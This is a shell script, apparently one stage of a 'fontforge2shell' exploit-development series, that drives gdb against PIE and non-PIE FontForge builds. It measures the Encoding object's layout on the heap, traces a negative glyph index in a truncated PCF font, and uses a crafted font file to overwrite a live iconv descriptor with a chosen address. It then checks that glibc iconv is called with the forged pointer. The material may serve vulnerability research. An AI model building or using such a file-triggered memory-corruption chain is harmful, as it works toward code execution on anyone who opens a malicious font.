#!/bin/sh
# fontforge2shell W27: close the called-pointer lane inside the real write window.
# Measures the heap Encoding object's fields relative to encs, proves its two
# direct function-pointer slots are calloc-NULL with no assignment site, traces
# the sticky EOF glyph indices, and drives a file-derived overwrite of the live
# iconv descriptor with a chosen mapped address. The Encoding/encs distance is
# argv-sensitive, so the glyph target is derived from each gdb transcript.
# Prerequisites: build-plain and build-nopie. No network or loopback service.
set -u
cd "$(dirname "$0")" || exit 2
[ -x build-plain/bin/fontforge ] || { echo 'missing build-plain' >&2; exit 2; }
[ -x build-nopie/bin/fontforge ] || { echo 'missing build-nopie' >&2; exit 2; }

fail=0; total=0
check() {
    label=$1; shift
    total=$((total+1))
    if "$@"; then printf 'PASS %s\n' "$label"; else printf 'FAIL %s\n' "$label"; fail=$((fail+1)); fi
}
has() { grep -qF "$1" "$2"; }
lacks() { ! grep -qF "$1" "$2"; }

for lane in pie nopie; do
    case "$lane" in
        pie) bin=build-plain/bin/fontforge ;;
        nopie) bin=build-nopie/bin/fontforge ;;
    esac
    cmd=/tmp/ff2s-w27-$lane.cmd

    # All three gdb runs in a lane use the same command-file path, keeping the
    # argv length (and therefore the measured heap distance) identical.
    printf 'set pagination off\nbreak fvimportbdf.c:1751 if glyph < 0\nrun -script %s/import-pcf.ff\nprintf "W27 lane=%%s encs=%%p encname=%%p delta=%%ld\\n", "%s", encs, encname, (char*)encname-(char*)encs\nprintf "W27 tounicode=%%p fromunicode=%%p tounicode_func=%%p fromunicode_func=%%p\\n", encname->tounicode, encname->fromunicode, encname->tounicode_func, encname->fromunicode_func\nprintf "W27 offsets %%ld %%ld %%ld %%ld\\n", (char*)&encname->tounicode-(char*)encname, (char*)&encname->fromunicode-(char*)encname, (char*)&encname->tounicode_func-(char*)encname, (char*)&encname->fromunicode_func-(char*)encname\nquit\n' "$PWD" "$lane" > "$cmd"
    gdb -q -batch -x "$cmd" "$bin" > "gdb-w27-$lane.out" 2>&1
    cp "$cmd" "gdb-w27-$lane.cmd"
    glyph=$(python3 w27-target.py "gdb-w27-$lane.out") || { echo "bad Encoding delta in $lane transcript" >&2; exit 2; }

    printf 'set pagination off\nbreak fvimportbdf.c:1750\nrun -script %s/import-pcf.ff\nwhile $bpnum==1\nprintf "W27G lane=%s i=%%d glyph=%%d\\n", i, glyph\ncontinue\nend\nquit\n' "$PWD" "$lane" > "$cmd"
    gdb -q -batch -x "$cmd" "$bin" > "gdb-w27-glyphs-$lane.out" 2>&1
    cp "$cmd" "gdb-w27-glyphs-$lane.cmd"
    python3 make-callpath-case.py "$glyph" 0x414243 >/dev/null || exit 2
    printf 'set pagination off\nbreak fvimportbdf.c:1751 if glyph < 0\nrun -script %s/import-callpath.ff\nprintf "W27C lane=%s before glyph=%%d tounicode=%%p\\n", glyph, encname->tounicode\nnext\nnext\nnext\nprintf "W27C lane=%s after glyph=%%d tounicode=%%p\\n", glyph, encname->tounicode\nbreak iconv\ncontinue\nprintf "W27C lane=%s iconv cd=%%p\\n", $rdi\nbt 3\ncontinue\nprintf "W27C lane=%s pc=%%p\\n", $pc\nquit\n' "$PWD" "$lane" "$lane" "$lane" "$lane" > "$cmd"
    gdb -q -batch -x "$cmd" "$bin" > "gdb-w27-callpath-$lane.out" 2>&1
    cp "$cmd" "gdb-w27-callpath-$lane.cmd"
done

for lane in pie nopie; do
    glyph=$(python3 w27-target.py "gdb-w27-$lane.out") || glyph=none
    check "$lane Encoding inside 1 KiB write window" test "$glyph" != none
    check "$lane field offsets are 72/80/88/96" has 'offsets 72 80 88 96' "gdb-w27-$lane.out"
    check "$lane direct function pointers are NULL" has 'tounicode_func=(nil) fromunicode_func=(nil)' "gdb-w27-$lane.out"
    check "$lane iconv descriptors are live" lacks 'tounicode=(nil)' "gdb-w27-$lane.out"
    check "$lane glyph trace reaches negative index at i=3" has 'i=3 glyph=-1' "gdb-w27-glyphs-$lane.out"
    check "$lane no other negative index in truncated PCF" lacks 'i=0 glyph=-' "gdb-w27-glyphs-$lane.out"
    check "$lane chosen negative index accepted" has "after glyph=$glyph" "gdb-w27-callpath-$lane.out"
done
check 'non-PIE tounicode low dword is file-chosen 0x414243' has 'tounicode=0x414243' "gdb-w27-callpath-nopie.out"
check 'non-PIE iconv receives chosen descriptor' has 'iconv cd=0x414243' "gdb-w27-callpath-nopie.out"
check 'PIE high dword is inherited 0x5555' has 'tounicode=0x555500414243' "gdb-w27-callpath-pie.out"
check 'PIE iconv receives inherited-high descriptor' has 'iconv cd=0x555500414243' "gdb-w27-callpath-pie.out"
check 'non-PIE faults in glibc __gconv before an indirect call' has '__gconv (cd=0x414243' "gdb-w27-callpath-nopie.out"
check 'non-PIE fault is at gconv.c:45' has 'gconv.c:45' "gdb-w27-callpath-nopie.out"
check 'iconv is reached through UniFromEnc' has 'in UniFromEnc' "gdb-w27-callpath-nopie.out"
check 'no assignment site for tounicode_func' sh -c "! grep -REn 'tounicode_func[[:space:]]*=[^=]' src/fontforge-20251009/fontforge --include='*.c'"
check 'no assignment site for fromunicode_func' sh -c "! grep -REn 'fromunicode_func[[:space:]]*=[^=]' src/fontforge-20251009/fontforge --include='*.c'"

echo '=== W27 normalized hashes ==='
for f in gdb-w27-pie.out gdb-w27-nopie.out gdb-w27-glyphs-pie.out gdb-w27-glyphs-nopie.out gdb-w27-callpath-pie.out gdb-w27-callpath-nopie.out; do
    printf '%s  ' "$f"
    grep -E '^W27' "$f" | sha256sum | cut -d' ' -f1
done
echo "REPLAY_W27_OK: $total checks, $fail failed"
[ "$fail" -eq 0 ]
